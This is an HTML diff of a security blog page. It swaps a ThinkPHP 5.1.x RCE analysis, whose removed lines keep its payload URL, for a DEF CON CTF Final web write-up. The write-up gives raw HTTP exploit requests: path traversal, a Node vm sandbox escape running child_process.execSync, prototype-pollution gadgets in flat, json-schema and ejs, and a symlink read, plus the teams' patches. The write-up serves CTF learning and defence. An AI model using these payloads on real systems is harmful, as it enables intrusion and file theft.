@@ -123,23 +123,34 @@
 
 
 
-  <meta name="keywords" content="Web,代码审计">
+  <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP5.1.x 代码执行漏洞分析">
-<meta property="og:url" content="https://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/index.html">
+<meta property="og:title" content="Defcon CTF Final Web WriteUp">
+<meta property="og:url" content="https://0day.design/2020/08/11/defcon CTF Final Web WriteUp/index.html">
 <meta property="og:site_name" content="Passer6y&#39;s Blog">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/b3x19d6f1pu5yz4crewkthn1/image_1d8ffjpn01kouopob14c9i1mt19.png">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/sxdjzyjnpeifkhixgpxvs1z3/image_1d8fsee7h1red11t7d9e14omhgk1j.png">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/o3ro7og9xlqyod0c96jda16v/image_1d8fvv9pa1aadflj4bu2b4pe81m.png">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/e402mqf4g33n4fwyo4qv5dtp/image_1d8fu10u5a7gujrjgt18171llc9.png">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/v25l3t0ne9lfknxopicxs1jo/image_1d8g15qpv1foi12mihmd1826mvr36.png">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/9neklp8y2cmhalulvogad1bt/image_1d8g1mln71tog1ud81g4l2931d053j.png">
-<meta property="og:image" content="https://static.zybuluo.com/Passer6y/i3q82hu9bdu5rdr6ghl1loxg/image_1d8g2fr8dkjqi9g1aah1unf18dj63.png">
-<meta property="og:updated_time" content="2020-03-19T12:47:56.506Z">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343895.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343940.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413463.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413475.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413482.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413489.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413496.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413505.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413513.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413533.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413539.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413549.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413559.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413572.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413583.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413592.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413599.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343948.jpg">
+<meta property="og:updated_time" content="2020-08-12T13:44:13.976Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ThinkPHP5.1.x 代码执行漏洞分析">
-<meta name="twitter:image" content="https://static.zybuluo.com/Passer6y/b3x19d6f1pu5yz4crewkthn1/image_1d8ffjpn01kouopob14c9i1mt19.png">
+<meta name="twitter:title" content="Defcon CTF Final Web WriteUp">
+<meta name="twitter:image" content="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343895.jpg">
 
 
 
@@ -148,7 +159,7 @@
 
 
 
-  <link rel="canonical" href="https://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/"/>
+  <link rel="canonical" href="https://0day.design/2020/08/11/defcon CTF Final Web WriteUp/"/>
 
 
 
@@ -158,7 +169,7 @@
   };
 </script>
 
-  <title>ThinkPHP5.1.x 代码执行漏洞分析 | Passer6y's Blog</title>
+  <title>Defcon CTF Final Web WriteUp | Passer6y's Blog</title>
   
 
 
@@ -392,7 +403,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/">
+    <link itemprop="mainEntityOfPage" href="https://0day.design/2020/08/11/defcon CTF Final Web WriteUp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Passer6y">
@@ -409,7 +420,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ThinkPHP5.1.x 代码执行漏洞分析
+          <h1 class="post-title" itemprop="name headline">Defcon CTF Final Web WriteUp
               
             
           </h1>
@@ -434,7 +445,7 @@
                 
               
 
-              <time title="Created: 2019-04-15 16:46:00" itemprop="dateCreated datePublished" datetime="2019-04-15T16:46:00+08:00">2019-04-15</time>
+              <time title="Created: 2020-08-11 10:00:00" itemprop="dateCreated datePublished" datetime="2020-08-11T10:00:00+08:00">2020-08-11</time>
             
 
             
@@ -451,11 +462,29 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2020-03-19 20:47:56" itemprop="dateModified" datetime="2020-03-19T20:47:56+08:00">2020-03-19</time>
+                <time title="Modified: 2020-08-12 21:44:13" itemprop="dateModified" datetime="2020-08-12T21:44:13+08:00">2020-08-12</time>
               
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -465,8 +494,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/" itemprop="commentCount"></span>
+                <a href="/2020/08/11/defcon CTF Final Web WriteUp/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2020/08/11/defcon CTF Final Web WriteUp/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -496,26 +525,34 @@
       
         <hr>
 <a id="more"></a>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><code>https://tprce/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
-<p><img src="https://static.zybuluo.com/Passer6y/b3x19d6f1pu5yz4crewkthn1/image_1d8ffjpn01kouopob14c9i1mt19.png" alt="image_1d8ffjpn01kouopob14c9i1mt19.png-104.1kB"></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从payload入手，在app处下断点跟入, <code>thinkphp/library/think/Request.php</code> 681行，处理兼容模式的url请求：</p>
-<p><img src="https://static.zybuluo.com/Passer6y/sxdjzyjnpeifkhixgpxvs1z3/image_1d8fsee7h1red11t7d9e14omhgk1j.png" alt="image_1d8fsee7h1red11t7d9e14omhgk1j.png-388.5kB"></p>
-<p>在<code>thinkphp/library/think/route/Rule.php</code> 947行<br><img src="https://static.zybuluo.com/Passer6y/o3ro7og9xlqyod0c96jda16v/image_1d8fvv9pa1aadflj4bu2b4pe81m.png" alt="image_1d8fvv9pa1aadflj4bu2b4pe81m.png-276.7kB"><br>可以看到其以<code>/</code>分割，分割成模块/控制器/操作方法</p>
-<p>路由解析，分发到对应模块/控制器/操作方法<code>thinkphp/library/think/route/dispatch/Url.php</code> 37行</p>
-<p><img src="https://static.zybuluo.com/Passer6y/e402mqf4g33n4fwyo4qv5dtp/image_1d8fu10u5a7gujrjgt18171llc9.png" alt="image_1d8fu10u5a7gujrjgt18171llc9.png-345.1kB"></p>
-<p><code>thinkphp/library/think/route/dispatch/Module.php</code>  84行 <code>exec()</code>，实例化控制器<br><img src="https://static.zybuluo.com/Passer6y/v25l3t0ne9lfknxopicxs1jo/image_1d8g15qpv1foi12mihmd1826mvr36.png" alt="image_1d8g15qpv1foi12mihmd1826mvr36.png-294.2kB"></p>
-<p>跟入该文件135行，该函数利用反射机制调用类方法，从而进行代码执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure></p>
-<p>-&gt; <code>thinkphp/library/think/Container.php</code> 347行 <code>invokeFunction()</code>：<br><img src="https://static.zybuluo.com/Passer6y/9neklp8y2cmhalulvogad1bt/image_1d8g1mln71tog1ud81g4l2931d053j.png" alt="image_1d8g1mln71tog1ud81g4l2931d053j.png-387.1kB"></p>
-<p>到这里就已经任意代码执行了。</p>
-<blockquote>
-<p>第一次接触反射机制，记录一下自己的理解，简单来说反射即根据目的地找来源，也就是根据已经实例化的对象来找其所属的类和类中的方法</p>
-</blockquote>
-<p>以上为ThinkPHP5.1.x的rce分析，ThinkPHP5.0.x有一些差异，以后来填坑。</p>
-<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>路由解析过程中没有对控制器的命名规则进行检测，导致我们可以操作任意控制器，官方修复加了正则只允许字符传入：<br><img src="https://static.zybuluo.com/Passer6y/i3q82hu9bdu5rdr6ghl1loxg/image_1d8g2fr8dkjqi9g1aah1unf18dj63.png" alt="image_1d8g2fr8dkjqi9g1aah1unf18dj63.png-173.9kB"></p>
-<p>参考：</p>
-<ol>
-<li><a href="https://www.kancloud.cn/shaoguan/phpstudy/384102" target="_blank" rel="noopener">PHP反射机制原理与用法详解</a></li>
-</ol>
+<h1 id="defcon-CTF-Final-Web-WriteUp"><a href="#defcon-CTF-Final-Web-WriteUp" class="headerlink" title="defcon CTF Final Web WriteUp"></a>defcon CTF Final Web WriteUp</h1><p>划水选手第一次打defcon，有幸能和<code>A*0*E</code>的大佬们一起见证历史，膜!!</p>
+<p>比赛分四场，第四场的0点时候才放web题<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343895.jpg" alt="-w272"></p>
+<p>源码：<a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-nooode-public</a></p>
+<p>一道nodeJS审计，任意文件包含，需要结合一堆依赖库找利用：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343940.jpg" alt="-w670"></p>
+<p>比赛刚开始的时候可以通过非预期等等姿势来直接包含flag<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.13.37.1:4017</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.22.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: /</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 9</span><br><span class="line"></span><br><span class="line">&#123;'foo':1&#125;HTTP/1.1 500 Internal Server Error</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 872</span><br><span class="line"><span class="attribute">ETag</span>: W/"368-7Bom1uI0U2E3Qp7J9cAwdko+TRk"</span><br><span class="line"><span class="attribute">Date</span>: Sun, 09 Aug 2020 16:33:58 GMT</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Invalid or unexpected token&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;pre&gt;/flag:1</span><br><span class="line"><span class="attribute">00059F8A3FCCD27002E4EE7F05C7ED50540869180234D354</span></span><br><span class="line"><span class="attribute">^^^^^</span></span><br></pre></td></tr></table></figure></p>
+<p>或者编码一下<code>/</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /config/validated/%2fflag/test HTTP/1.1</span><br><span class="line">Host: 10.13.37.1:4017</span><br><span class="line">User-Agent: curl/7.68.0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure></p>
+<p>后来大家修复很多都直接粗暴的把<code>require</code>、<code>readFileSync</code>的参数都给成常量，然后就没洞打了。</p>
+<p>大概到了两点的样子，重置了patch，不能用原来直接写死<code>require</code>的方式patch了，白名单patch会被check，最后根据已知poc一个个加的黑名单patch</p>
+<p>打node内置库vm沙箱逃逸的payload，在<a href="https://devdocs.io/node/" target="_blank" rel="noopener">devdocs.io</a>可以找到其他内置库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /config/validated/vm/runInThisContext HTTP/1.1</span><br><span class="line">Host: 10.13.37.1:4017</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: /</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: application/json</span><br><span class="line">Content-Length: 158</span><br><span class="line"></span><br><span class="line">[&quot;var process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</span><br></pre></td></tr></table></figure></p>
+<p>预期解有一个应该是用flat的一个原型链污染：<a href="https://github.com/hughsk/flat/issues/105" target="_blank" rel="noopener">https://github.com/hughsk/flat/issues/105</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /config/validated/flat/unflatten HTTP/1.1</span><br><span class="line">Host: 10.13.37.1:4017</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: /</span><br><span class="line">User-Agent: python-requests/2.24.0</span><br><span class="line">Content-Length: 22</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">__proto__.path=%2Fflag</span><br></pre></td></tr></table></figure></p>
+<p>flat是一个js的对象解析库，提供了像下图这样解析对象的功能，当传入<code>__proto__.path</code>这样的参数时，即会被污染原型。<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413463.jpg" alt="-w917"></p>
+<p>源码分析：<br>通过<code>.</code>分割参数，将<code>__proto__</code>当成key传入即可污染原型<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413475.jpg" alt="-w941"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413482.jpg" alt="-w329"></p>
+<p>另外这里还有一个特性即js里可以传入部分参数来进行函数调用，不同于java的多态：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413489.jpg" alt="-w566"></p>
+<p>修复：<br>作者在修复中判断了<code>key1</code>不能为<code>__proto__</code>:<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413496.jpg" alt="-w806"></p>
+<p>还有一个flag会被截断的链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /config/validated/jsonlint/main HTTP/1.1</span><br><span class="line">Host: 10.13.37.1:4017</span><br><span class="line">User-Agent: python-requests/2.24.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">&#123;&quot;1&quot;:&quot;../../../../../../../flag&quot;&#125;HTTP/1.1 500 Internal Server Error</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 1188</span><br><span class="line">ETag: W/&quot;4a4-a7qhEennNdtDoehPQx3fDgEK7ww&quot;</span><br><span class="line">Date: Sun, 09 Aug 2020 18:26:27 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Parse error on line 1:</span><br><span class="line">0002DE946789B7BCFFCC</span><br><span class="line">^</span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;&#123;&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;pre&gt;Error: Parse error on line 1:</span><br><span class="line">0002DE946789B7BCFFCC</span><br></pre></td></tr></table></figure></p>
+<p>大概5点的样子流量监控到td的大佬软连接读到我们的flag了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /config/validated/fstream/Writer HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:4017</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 76</span><br><span class="line">Cookie: __utma=96992031.1308333994.1563790586.1563790586.1563793582.2; csrftoken=jDxu0gfu0oXpRCP5r0wYq0UA7dQau6KfqbXOYH4PQ9O87MwCx5ZAz0THbRMzId2T</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;:&quot;SymbolicLink&quot;,&quot;linkpath&quot;:&quot;/flag&quot;,&quot;path&quot;:&quot;public/stylesheets/wupco&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里还可以通过软连接源码去读别人patch绕过。</p>
+<p>json-schema的gadget:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /config/validated HTTP/1.1</span><br><span class="line">Host: 10.13.37.3:4017</span><br><span class="line">User-Agent: python-requests/2.11.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: /</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 90</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;$schema&quot;: &#123;&quot;properties&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;: &#123;&quot;path&quot;: &#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>调用validate:<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413505.jpg" alt="-w991"><br>传入可控的<code>instance</code>参数，<code>schema</code>为<code>instance.$schema</code>传入：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413513.jpg" alt="-w981"></p>
+<p>这里主要看164行<code>checkObj</code>的调用，注意第二个参数<code>schema.properties</code>，即为我们post的json数据：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413533.jpg" alt="-w1421"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413539.jpg" alt="-w667"></p>
+<p>checkObj函数的代码如下，将propDef赋值为<code>objTypeDef.__proto__</code>，即<code>schema.properties.__proto__</code>，然后作为参数再次调用<code>checkProp(value, schema, path, i)</code>，而value变成了<code>instance[i]</code>即instance的原型<code>instance.__proto__</code>：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413549.jpg" alt="-w1466"></p>
+<p>然后又到了从<code>checkProp()</code>执行到了<code>checkObj()</code>函数：再一次获取第二个参数<code>schema.properties</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413559.jpg" alt="-w1085"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413572.jpg" alt="-w679"></p>
+<p>最后将<code>propDef[&quot;default&quot;]</code>也就是<code>/flag</code>，传递给了value，也就是instance的原型，即成功污染：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413583.jpg" alt="-w1421"></p>
+<p>其他几个链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;outputFunctionName&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://twitter.com/CVEnew/status/1283502926011543555" target="_blank" rel="noopener">https://twitter.com/CVEnew/status/1283502926011543555</a></p>
+<p>修复代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if(JSON.stringify(req.body).includes(&apos;__&apos;)) throw new Error(&apos;fuck&apos;)</span><br><span class="line">if([&apos;vm&apos;, &apos;node-sass&apos;, &apos;jsonlint&apos;, &apos;ejs&apos;].includes(req.params.lib)) throw new Error(&apos;asdf&apos;)</span><br><span class="line">if(req.params.lib.includes(&apos;flag&apos;)) throw new Error(&apos;asdf&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// pig的修复</span><br><span class="line">for(var Val in Object.prototype)</span><br><span class="line">&#123;</span><br><span class="line">  console.log(Val)</span><br><span class="line">  if(Object.hasOwnProperty(Val))&#123;</span><br><span class="line">    continue</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    delete Object.prototype[Val];</span><br><span class="line">    console.log(`$&#123;Object.prototype[Val]&#125;is delete`);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>因为<code>~</code>的原因且出题人没给lock文件导致：服务器可以看到warn漏洞：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413592.jpg" alt="-w845"><br>而本地啥也没有<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971465413599.jpg" alt="-w535"></p>
+<p>几个关键的时间节点：(来自Cody大佬的复盘<br><img src="http://static-passer6y.d0g3.cn/0day/2020-08-11-15971224343948.jpg" alt="IMG_1488"></p>
 
       
     </div>
@@ -538,7 +575,7 @@
     <strong>Post author:  </strong>Passer6y</li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="https://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/" title="ThinkPHP5.1.x 代码执行漏洞分析">https://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/</a>
+    <a href="https://0day.design/2020/08/11/defcon CTF Final Web WriteUp/" title="Defcon CTF Final Web WriteUp">https://0day.design/2020/08/11/defcon CTF Final Web WriteUp/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/3.0/deed.zh">CC BY-NC-SA 3.0</a>许可协议。转载请注明出处！</li>
@@ -551,9 +588,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
-          
-            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
           
         </div>
       
@@ -566,8 +601,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/15/ThinkPHP5 SQL注入漏洞分析/" rel="next" title="ThinkPHP5 SQL注入漏洞分析">
-                <i class="fa fa-chevron-left"></i> ThinkPHP5 SQL注入漏洞分析
+              <a href="/2020/06/01/RCTF-2020-WriteUp/" rel="next" title="RCTF2020 Rblog WriteUp">
+                <i class="fa fa-chevron-left"></i> RCTF2020 Rblog WriteUp
               </a>
             
           </div>
@@ -575,10 +610,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/27/RSA小结/" rel="prev" title="RSA小结">
-                RSA小结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -826,7 +857,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">1.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修复"><span class="nav-number">3.</span> <span class="nav-text">修复</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#defcon-CTF-Final-Web-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">defcon CTF Final Web WriteUp</span></a></li></ol></div>
             
 
           </div>
